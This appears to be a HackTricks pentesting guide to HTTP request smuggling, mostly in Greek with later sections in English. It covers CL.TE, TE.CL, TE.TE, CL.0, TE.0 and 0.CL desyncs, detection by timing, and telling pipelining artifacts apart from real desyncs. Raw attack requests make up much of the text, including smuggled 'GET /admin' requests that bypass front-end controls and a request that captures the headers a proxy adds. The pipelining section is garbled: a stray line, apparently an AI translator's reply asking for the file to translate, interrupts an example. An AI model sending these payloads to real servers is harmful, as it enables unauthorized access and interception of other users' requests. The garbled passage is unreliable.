# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Τι είναι

Αυτή η ευπάθεια εμφανίζεται όταν ένας **αποσυγχρονισμός** μεταξύ των **front-end proxies** και του **back-end** server επιτρέπει σε έναν **attacker** να **στείλει** ένα HTTP **request** που θα **ερμηνευτεί** ως **ένα request** από τους **front-end proxies** (load balance/reverse-proxy) και **ως 2 request** από τον **back-end** server.\
Αυτό επιτρέπει σε έναν χρήστη να **τροποποιήσει το επόμενο request που φτάνει στον back-end server μετά από το δικό του**.

### Θεωρία

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> Η επικεφαλίδα Content-Length υποδεικνύει το μέγεθος του entity-body, σε bytes, που αποστέλλεται στον παραλήπτη.

**Transfer-Encoding: chunked**

> Η επικεφαλίδα Transfer-Encoding καθορίζει τη μορφή κωδικοποίησης που χρησιμοποιείται για την ασφαλή μεταφορά του payload body στον χρήστη.\
> Το chunked σημαίνει ότι μεγάλα δεδομένα αποστέλλονται σε μια σειρά από chunks.

### Πραγματικότητα

Το **Front-End** (load-balancer / Reverse Proxy) **επεξεργάζεται** είτε την επικεφαλίδα _**Content-Length**_ είτε την _**Transfer-Encoding**_, και ο **Back-end** server **επεξεργάζεται την άλλη**, προκαλώντας έναν **αποσυγχρονισμό** μεταξύ των δύο συστημάτων.\
Αυτό μπορεί να είναι πολύ κρίσιμο αφού **ένας attacker θα μπορεί να στείλει ένα request** στο reverse proxy που ο **back-end** server θα **ερμηνεύσει** **ως 2 διαφορετικά requests**. Ο **κίνδυνος** αυτής της τεχνικής έγκειται στο ότι ο **back-end** server **θα ερμηνεύσει** το **2ο injected request** σαν να **ήρθε από τον επόμενο client**, και το **πραγματικό request** αυτού του client θα γίνει **μέρος** του **injected request**.

### Ιδιαιτερότητες

Θυμηθείτε ότι στο HTTP **ένα νέο χαρακτήρα γραμμής αποτελείται από 2 bytes**:

- **Content-Length**: Αυτή η επικεφαλίδα χρησιμοποιεί έναν **δεκαδικό αριθμό** για να υποδείξει τον **αριθμό** των **bytes** του **body** του request. Το body αναμένεται να τελειώνει στον τελευταίο χαρακτήρα — **δεν απαιτείται νέα γραμμή στο τέλος του request**.
- **Transfer-Encoding:** Αυτή η επικεφαλίδα χρησιμοποιεί στο **body** έναν **εξαδικό αριθμό** για να υποδείξει τον **αριθμό** των **bytes** του **επόμενου chunk**. Το **chunk** πρέπει να **τελειώνει** με **νέα γραμμή**, αλλά αυτή η νέα γραμμή **δεν περιλαμβάνεται** από τον δείκτη μήκους. Αυτή η μέθοδος μεταφοράς πρέπει να τελειώνει με **chunk μεγέθους 0 ακολουθούμενο από 2 νέες γραμμές**: `0`
- **Connection**: Από την εμπειρία μου συνιστάται να χρησιμοποιείτε **`Connection: keep-alive`** στο πρώτο request του request Smuggling.

### Ορατό - Κρυφό

Το κύριο πρόβλημα με το HTTP/1.1 είναι ότι όλα τα requests πηγαίνουν στο ίδιο TCP socket, οπότε αν βρεθεί μια διαφορά ανάμεσα σε 2 συστήματα που λαμβάνουν requests, είναι δυνατόν να σταλεί ένα request που θα θεωρηθεί ως 2 διαφορετικά requests (ή περισσότερα) από τον τελικό backend (ή ακόμα και ενδιάμεσα συστήματα).

[Αυτό το blog post](https://portswigger.net/research/http1-must-die) προτείνει νέους τρόπους για να ανιχνευθούν desync attacks σε ένα σύστημα που δεν θα σηματοδοτηθούν από WAFs. Για αυτό παρουσιάζει τις συμπεριφορές Visible vs Hidden. Ο στόχος σε αυτή την περίπτωση είναι να επιχειρήσουμε να βρούμε ασυνέπειες στην απάντηση χρησιμοποιώντας τεχνικές που θα μπορούσαν να προκαλούν desyncs χωρίς να εκμεταλλευόμαστε πραγματικά κάτι.

Για παράδειγμα, στέλνοντας ένα request με το κανονικό Host header και ένα " host" header, αν ο backend παραπονιέται για αυτό το request (ίσως επειδή η τιμή του " host" είναι λανθασμένη) αυτό πιθανώς σημαίνει ότι το front-end δεν είδε το " host" header ενώ ο τελικός backend το χρησιμοποίησε — κάτι που πιθανόν υποδηλώνει έναν αποσυγχρονισμό μεταξύ front-end και backend.

Αυτό θα ήταν μια **Κρυφό-Ορατό (Hidden-Visible) ανισορροπία**.

Αν το front-end είχε λάβει υπόψη το " host" header αλλά ο front-end δεν το έκανε, αυτό θα μπορούσε να είναι μια **Ορατό-Κρυφό (Visible-Hidden)** κατάσταση.

Για παράδειγμα, αυτό επέτρεψε την ανακάλυψη desyncs μεταξύ AWS ALB ως front-end και IIS ως backend. Αυτό έγινε επειδή όταν στάλθηκε το "Host: foo/bar", το ALB επέστρεψε `400, Server; awselb/2.0`, αλλά όταν στάλθηκε το "Host : foo/bar" επέστρεψε `400, Server: Microsoft-HTTPAPI/2.0`, υποδεικνύοντας ότι ο backend έστελνε την απάντηση. Αυτό είναι μια Κρυφό-Ορατό (H-V) κατάσταση.

Σημειώστε ότι αυτή η κατάσταση δεν έχει διορθωθεί στην AWS, αλλά μπορεί να προληφθεί ρυθμίζοντας `routing.http.drop_invalid_header_fields.enabled` και `routing.http.desync_mitigation_mode = strictest`.


## Basic Examples

> [!TIP]
> Όταν προσπαθείτε να το εκμεταλλευτείτε με το Burp Suite **απενεργοποιήστε το `Update Content-Length` και το `Normalize HTTP/1 line endings`** στο repeater γιατί κάποια gadgets εκμεταλλεύονται newlines, carriage returns και malformed content-lengths.

Τα HTTP request smuggling attacks κατασκευάζονται στέλνοντας αμφίβολα requests που εκμεταλλεύονται διαφορές στον τρόπο που τα front-end και back-end servers ερμηνεύουν τις επικεφαλίδες `Content-Length` (CL) και `Transfer-Encoding` (TE). Αυτές οι επιθέσεις μπορούν να εμφανιστούν σε διάφορες μορφές, κυρίως ως **CL.TE**, **TE.CL**, και **TE.TE**. Κάθε τύπος αντιπροσωπεύει έναν μοναδικό συνδυασμό του πώς οι front-end και back-end servers προτεραιοποιούν αυτές τις επικεφαλίδες. Οι ευπάθειες προκύπτουν από το γεγονός ότι οι servers επεξεργάζονται το ίδιο request με διαφορετικό τρόπο, οδηγώντας σε απροσδόκητα και ενδεχομένως κακόβουλα αποτελέσματα.

### Βασικά Παραδείγματα Τύπων Ευπάθειας

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> Στον προηγούμενο πίνακα θα πρέπει να προσθέσετε την τεχνική TE.0, όπως την τεχνική CL.0 αλλά χρησιμοποιώντας Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Επεξεργάζεται το request βάσει της επικεφαλίδας `Content-Length`.
- **Back-End (TE):** Επεξεργάζεται το request βάσει της επικεφαλίδας `Transfer-Encoding`.
- **Σενάριο επίθεσης:**

- Ο attacker στέλνει ένα request όπου η τιμή της επικεφαλίδας `Content-Length` δεν ταιριάζει με το πραγματικό μήκος του περιεχομένου.
- Ο front-end server προωθεί ολόκληρο το request στον back-end, βάσει της τιμής του `Content-Length`.
- Ο back-end server επεξεργάζεται το request ως chunked λόγω της επικεφαλίδας `Transfer-Encoding: chunked`, ερμηνεύοντας τα υπόλοιπα δεδομένα ως ένα ξεχωριστό, επακόλουθο request.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Επεξεργάζεται το request βάσει της επικεφαλίδας `Transfer-Encoding`.
- **Back-End (CL):** Επεξεργάζεται το request βάσει της επικεφαλίδας `Content-Length`.
- **Σενάριο επίθεσης:**

- Ο attacker στέλνει ένα chunked request όπου το μέγεθος του chunk (`7b`) και το πραγματικό μήκος περιεχομένου (`Content-Length: 4`) δεν ευθυγραμμίζονται.
- Ο front-end server, σεβόμενος το `Transfer-Encoding`, προωθεί ολόκληρο το request στον back-end.
- Ο back-end server, σεβόμενος το `Content-Length`, επεξεργάζεται μόνο το αρχικό μέρος του request (`7b` bytes), αφήνοντας τα υπόλοιπα ως μέρος ενός ανεπιθύμητου επακόλουθου request.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Και οι δύο υποστηρίζουν `Transfer-Encoding`, αλλά ο ένας μπορεί να παραπλανηθεί ώστε να το αγνοήσει μέσω απο-διομπλοκάρισματος/απο-σαμποταρίσματος.
- **Σενάριο επίθεσης:**

- Ο attacker στέλνει ένα request με αποπροσανατολισμένες/obfuscated επικεφαλίδες `Transfer-Encoding`.
- Ανάλογα με το ποιος server (front-end ή back-end) αποτύχει να αναγνωρίσει την αποπροσανατολισμένη επικεφαλίδα, μπορεί να εκμεταλλευτείται μια ευπάθεια CL.TE ή TE.CL.
- Το μη επεξεργασμένο μέρος του request, όπως το βλέπει ένας από τους servers, γίνεται μέρος ενός επακόλουθου request, οδηγώντας σε smuggling.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Και οι δύο servers επεξεργάζονται το request αποκλειστικά βάσει της επικεφαλίδας `Content-Length`.
- Αυτό το σενάριο συνήθως δεν οδηγεί σε smuggling, καθώς υπάρχει ευθυγράμμιση στον τρόπο που και οι δύο servers ερμηνεύουν το μήκος του request.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Αφορά σενάρια όπου η επικεφαλίδα `Content-Length` υπάρχει και έχει τιμή διαφορετική του μηδενός, υποδεικνύοντας ότι το request body έχει περιεχόμενο. Ο back-end αγνοεί την επικεφαλίδα `Content-Length` (την αντιμετωπίζει ως 0), αλλά το front-end την αναλύει.
- Είναι κρίσιμο για την κατανόηση και κατασκευή smuggling επιθέσεων, καθώς επηρεάζει το πώς οι servers καθορίζουν το τέλος ενός request.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Όπως το προηγούμενο αλλά χρησιμοποιώντας TE.
- Τεχνική [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Παράδειγμα**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Σενάριο

Σε ένα `0.CL` σενάριο, ένα request αποστέλλεται με Content-Length όπως:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
Και το front-end δεν λαμβάνει υπόψη το `Content-Length`, οπότε στέλνει μόνο το πρώτο request στο backend (μέχρι το 7 στο παράδειγμα). Ωστόσο, το backend βλέπει το `Content-Length` και περιμένει για ένα body που ποτέ δεν φτάνει γιατί το front-end ήδη περιμένει την response.

Ωστόσο, αν υπάρχει ένα request που μπορεί να σταλεί στο backend και στο οποίο απαντάνε πριν ληφθεί το body του request, αυτό το deadlock δεν θα συμβεί. Σε IIS για παράδειγμα αυτό συμβαίνει στέλνοντας requests σε απαγορευμένες λέξεις όπως `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), με αυτόν τον τρόπο, το αρχικό request θα απαντηθεί άμεσα και το δεύτερο request θα περιέχει το request του victim όπως:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
Αυτό είναι χρήσιμο για να προκαλέσει μια desync, αλλά μέχρι τώρα δεν έχει κανένα αντίκτυπο.

Ωστόσο, το post προσφέρει μια λύση γι' αυτό μετατρέποντας ένα **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Σπάσιμο του web server

Αυτή η τεχνική είναι επίσης χρήσιμη σε σενάρια όπου είναι δυνατό να προκαλέσετε σφάλμα στον web server κατά την ανάγνωση των αρχικών δεδομένων HTTP αλλά χωρίς να κλείσετε τη σύνδεση. Με αυτόν τον τρόπο, το **body** του HTTP request θα θεωρηθεί το **next HTTP request**.

Για παράδειγμα, όπως εξηγείται στο [**this writeup**](https://mizu.re/post/twisty-python), στο Werkzeug ήταν δυνατό να σταλούν μερικοί χαρακτήρες **Unicode** και αυτό θα έκανε τον server να **σπάσει**. Ωστόσο, αν η HTTP σύνδεση δημιουργήθηκε με το header **`Connection: keep-alive`**, το body του request δεν θα διαβαστεί και η σύνδεση θα παραμείνει ανοιχτή, οπότε το **body** του request θα θεωρηθεί ως το **next HTTP request**.

#### Εξαναγκασμός μέσω hop-by-hop headers

Καταχρώμενοι τα hop-by-hop headers μπορείτε να υποδείξετε στον proxy να **διαγράψει το header Content-Length ή Transfer-Encoding ώστε να είναι δυνατή η εκμετάλλευση μέσω HTTP request smuggling**.
```
Connection: Content-Length
```
For **περισσότερες πληροφορίες σχετικά με hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Finding HTTP Request Smuggling

Ο εντοπισμός των ευπαθειών HTTP request smuggling μπορεί συχνά να επιτευχθεί χρησιμοποιώντας τεχνικές χρονισμού (timing techniques), οι οποίες βασίζονται στην παρατήρηση του πόσος χρόνος απαιτείται για να απαντήσει ο server σε χειραγωγημένα αιτήματα. Αυτές οι τεχνικές είναι ιδιαίτερα χρήσιμες για τον εντοπισμό των CL.TE και TE.CL ευπαθειών. Εκτός από αυτές τις μεθόδους, υπάρχουν και άλλες στρατηγικές και εργαλεία που μπορούν να χρησιμοποιηθούν για να βρεθούν τέτοιες ευπάθειες:

### Εντοπισμός ευπαθειών CL.TE με τεχνικές χρονισμού

- **Μέθοδος:**

- Στείλτε ένα αίτημα που, εάν η εφαρμογή είναι ευάλωτη, θα κάνει τον back-end server να περιμένει επιπλέον δεδομένα.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Παρατήρηση:**
- Ο front-end server επεξεργάζεται το αίτημα βάσει του `Content-Length` και κόβει το μήνυμα πρόωρα.
- Ο back-end server, περιμένοντας ένα chunked μήνυμα, αναμένει το επόμενο chunk που δεν φτάνει ποτέ, προκαλώντας καθυστέρηση.

- **Δείκτες:**
- Χρονικά όρια ή μεγάλες καθυστερήσεις στην απόκριση.
- Λήψη σφάλματος 400 Bad Request από τον back-end server, μερικές φορές με λεπτομερείς πληροφορίες διακομιστή.

### Εντοπισμός ευπαθειών TE.CL με τεχνικές χρονισμού

- **Μέθοδος:**

- Στείλτε ένα αίτημα που, εάν η εφαρμογή είναι ευάλωτη, θα κάνει τον back-end server να περιμένει επιπλέον δεδομένα.
- **Παράδειγμα:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Παρατήρηση:**
- Ο front-end server επεξεργάζεται το αίτημα βάσει του `Transfer-Encoding` και προωθεί ολόκληρο το μήνυμα.
- Ο back-end server, περιμένοντας ένα μήνυμα βάσει του `Content-Length`, αναμένει επιπλέον δεδομένα που δεν φτάνουν ποτέ, προκαλώντας καθυστέρηση.

### Άλλες μέθοδοι για τον εντοπισμό ευπαθειών

- **Ανάλυση διαφορών στην απόκριση:**
- Στείλτε ελαφρώς διαφορετικές εκδοχές ενός αιτήματος και παρατηρήστε αν οι αποκρίσεις του server διαφέρουν με μη αναμενόμενο τρόπο, υποδεικνύοντας ασυμφωνία στην ανάλυση (parsing).
- **Χρήση αυτοματοποιημένων εργαλείων:**
- Εργαλεία όπως το extension 'HTTP Request Smuggler' του Burp Suite μπορούν να ελέγξουν αυτόματα για αυτές τις ευπάθειες στέλνοντας διάφορες μορφές αμφίβολων αιτημάτων και αναλύοντας τις αποκρίσεις.
- **Δοκιμές διακύμανσης Content-Length:**
- Στείλτε αιτήματα με μεταβαλλόμενες τιμές `Content-Length` που δεν ευθυγραμμίζονται με το πραγματικό μήκος περιεχομένου και παρατηρήστε πώς ο server χειρίζεται αυτές τις ασυμφωνίες.
- **Δοκιμές διακύμανσης Transfer-Encoding:**
- Στείλτε αιτήματα με ασαφείς ή κατεστραμμένες κεφαλίδες `Transfer-Encoding` και παρακολουθήστε πώς οι front-end και back-end servers ανταποκρίνονται διαφορετικά σε τέτοιες χειραγωγήσεις.

### Η κεφαλίδα `Expect: 100-continue`

Ελέγξτε πώς αυτή η κεφαλίδα μπορεί να βοηθήσει στην εκμετάλλευση ενός http desync σε:

{{#ref}}
../special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Αφού επιβεβαιώσετε την αποτελεσματικότητα των τεχνικών χρονισμού, είναι κρίσιμο να επαληθεύσετε αν τα αιτήματα των clients μπορούν να χειραγωγηθούν. Μια απλή μέθοδος είναι να επιχειρήσετε να δηλητηριάσετε (poison) τα αιτήματά σας, για παράδειγμα κάνοντας ένα αίτημα προς `/` να επιστρέψει 404. Τα παραδείγματα `CL.TE` και `TE.CL` που αναφέρθηκαν προηγουμένως στο [Basic Examples](#basic-examples) δείχνουν πώς να δηλητηριάσετε το αίτημα ενός client για να προκαλέσετε μια απόκριση 404, παρότι ο client στοχεύει σε διαφορετικό πόρο.

**Κύρια σημεία προς εξέταση**

Κατά τη δοκιμή για request smuggling παρεμβαίνοντας σε άλλα αιτήματα, λάβετε υπόψη:

- **Διακριτές δικτυακές συνδέσεις:** Τα "attack" και "normal" αιτήματα πρέπει να αποστέλλονται μέσω ξεχωριστών δικτυακών συνδέσεων. Χρήση της ίδιας σύνδεσης και για τα δύο δεν επιβεβαιώνει την ύπαρξη ευπάθειας.
- **Συνεπές URL και παράμετροι:** Προσπαθήστε να χρησιμοποιήσετε τα ίδια URLs και ονόματα παραμέτρων για και τα δύο αιτήματα. Οι σύγχρονες εφαρμογές συχνά δρομολογούν αιτήματα σε συγκεκριμένους back-end servers βάσει URL και παραμέτρων. Η αντιστοιχία αυτών αυξάνει την πιθανότητα ότι και τα δύο αιτήματα θα επεξεργαστούν από τον ίδιο server, προαπαιτούμενο για μια επιτυχημένη επίθεση.
- **Χρονισμός και συνθήκες αγώνα (racing):** Το "normal" αίτημα, που προορίζεται για την ανίχνευση παρεμβολής από το "attack" αίτημα, ανταγωνίζεται άλλα ταυτόχρονα αιτήματα της εφαρμογής. Για αυτό, στείλτε το "normal" αίτημα αμέσως μετά το "attack" αίτημα. Πολυφορτωμένες εφαρμογές μπορεί να απαιτούν πολλαπλές δοκιμές για σίγουρη επιβεβαίωση της ευπάθειας.
- **Προκλήσεις Load Balancing:** Front-end servers που λειτουργούν ως load balancers μπορεί να διανέμουν τα αιτήματα σε διάφορα back-end συστήματα. Αν τα "attack" και "normal" αιτήματα καταλήξουν σε διαφορετικά συστήματα, η επίθεση δεν θα πετύχει. Αυτό το θέμα με το load balancing μπορεί να απαιτήσει πολλαπλές προσπάθειες για να επιβεβαιωθεί μια ευπάθεια.
- **Ακούσιος αντίκτυπος σε χρήστες:** Αν η επίθεσή σας επηρεάσει ακούσια το αίτημα κάποιου άλλου χρήστη (όχι το "normal" αίτημα που στείλατε για ανίχνευση), αυτό δείχνει ότι η επίθεσή σας επηρέασε άλλον χρήστη της εφαρμογής. Συνεχής δοκιμή μπορεί να διαταράξει άλλους χρήστες, απαιτώντας προσεκτική προσέγγιση.

## Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling

Η επαναχρησιμοποίηση σύνδεσης (keep-alive) και το pipelining μπορούν εύκολα να παράγουν ψευδαισθήσεις "smuggling" σε εργαλεία δοκιμών που στέλνουν πολλαπλά αιτήματα στην ίδια socket. Μάθετε να διαχωρίζετε τα ακίνδυνα client-side artifacts από τον πραγματικό server-side desync.

### Γιατί το pipelining δημιουργεί κλασικά false positives

Το HTTP/1.1 επαναχρησιμοποιεί μια ενιαία TCP/TLS σύνδεση και συρράπτει (concatenates) αιτήματα και απαντήσεις στο ίδιο stream. Στο pipelining, ο client στέλνει πολλαπλά αιτήματα το ένα μετά το άλλο και βασίζεται σε απαντήσεις με τη σειρά. Ένα κοινό false-positive είναι η επανεκπομπή ενός κακοσχηματισμένου CL.0-style payload δύο φορές στην ίδια σύνδεση:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Παρακαλώ επικολλήστε το περιεχόμενο του αρχείου src/pentesting-web/http-request-smuggling/README.md που θέλετε να μεταφράσω στα Ελληνικά. Θα διατηρήσω ανέπαφα τα markdown, τα tags, τα links και τα paths όπως ζητήθηκε.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Εάν ο server αγνόησε το κακομορφωμένο `Content_Length`, δεν υπάρχει FE↔BE desync. Με reuse, ο client σας στην πραγματικότητα έστειλε αυτό το byte-stream, το οποίο ο server ανέλυσε ως δύο ανεξάρτητα requests:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: none. You just desynced your client from the server framing.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus tests: pipelining or real desync?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
- In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
- If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
2. HTTP/2 nested-response check
- Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
3. Partial-requests probe for connection-locked front-ends
- Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
- See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4. State probes
- Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
- Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5. Visualize the wire
- Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.

### Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
- Prove the server-side bug
- Use the HTTP/2 nested-response check, or
- Use partial-requests to show the FE only reuses upstream when the client does.
- Show real impact even if direct cross-user socket abuse is blocked:
- Cache poisoning: poison shared caches via the desync so responses affect other users.
- Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
- Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.

> [!NOTE]
> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.

Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Στην επίθεση CL.TE, η κεφαλίδα `Content-Length` χρησιμοποιείται για το αρχικό αίτημα, ενώ το επακόλουθο ενσωματωμένο αίτημα χρησιμοποιεί την κεφαλίδα `Transfer-Encoding: chunked`. Ο front-end proxy επεξεργάζεται το αρχικό αίτημα `POST` αλλά αποτυγχάνει να ελέγξει το ενσωματωμένο αίτημα `GET /admin`, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση στη διαδρομή `/admin`.

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Αντιστρόφως, στην επίθεση TE.CL, το αρχικό `POST` request χρησιμοποιεί `Transfer-Encoding: chunked`, και το επακόλουθο ενσωματωμένο request επεξεργάζεται με βάση το header `Content-Length`. Παρόμοια με την επίθεση CL.TE, ο front-end proxy παραβλέπει το smuggled `GET /admin` request, δίνοντας ακούσια πρόσβαση στο περιορισμένο μονοπάτι `/admin`.

### Αποκάλυψη front-end request rewriting <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Εφαρμογές συχνά χρησιμοποιούν έναν **front-end server** για να τροποποιούν τα εισερχόμενα requests πριν τα προωθήσουν στον back-end server. Μια τυπική τροποποίηση περιλαμβάνει την προσθήκη headers, όπως `X-Forwarded-For: <IP of the client>`, για να μεταδώσουν το IP του client στο back-end. Η κατανόηση αυτών των τροποποιήσεων μπορεί να είναι κρίσιμη, καθώς μπορεί να αποκαλύψει τρόπους για **bypass protections** ή **uncover concealed information or endpoints**.

Για να διερευνήσετε πώς ένας proxy τροποποιεί ένα request, εντοπίστε ένα POST parameter που ο back-end echoes στην response. Στη συνέχεια, στήστε ένα request, χρησιμοποιώντας αυτό το parameter τελευταίο, παρόμοιο με το ακόλουθο:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Σε αυτή τη δομή, τα επόμενα στοιχεία του αιτήματος προστίθενται μετά το `search=`, η οποία είναι η παράμετρος που αντανακλάται στην απάντηση. Αυτή η ανάκλαση θα αποκαλύψει τις κεφαλίδες του επόμενου αιτήματος.

Είναι σημαντικό να ευθυγραμμιστεί η κεφαλίδα `Content-Length` του nested request με το πραγματικό μήκος του περιεχομένου. Είναι προτιμότερο να ξεκινήσετε με μια μικρή τιμή και να την αυξάνετε σταδιακά, καθώς μια πολύ χαμηλή τιμή θα αποκόψει τα αντανακλόμενα δεδομένα, ενώ μια πολύ υψηλή τιμή μπορεί να προκαλέσει σφάλμα στο αίτημα.

Αυτή η τεχνική ισχύει επίσης στο πλαίσιο μιας TE.CL ευπάθειας, αλλά το αίτημα πρέπει να τερματίζει με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες νέας γραμμής, οι τιμές θα προστίθενται στην παράμετρο `search`.

Αυτή η μέθοδος εξυπηρετεί κυρίως την κατανόηση των τροποποιήσεων του αιτήματος που πραγματοποιεί το front-end proxy, ουσιαστικά διεξάγοντας μια αυτοκατευθυνόμενη διερεύνηση.

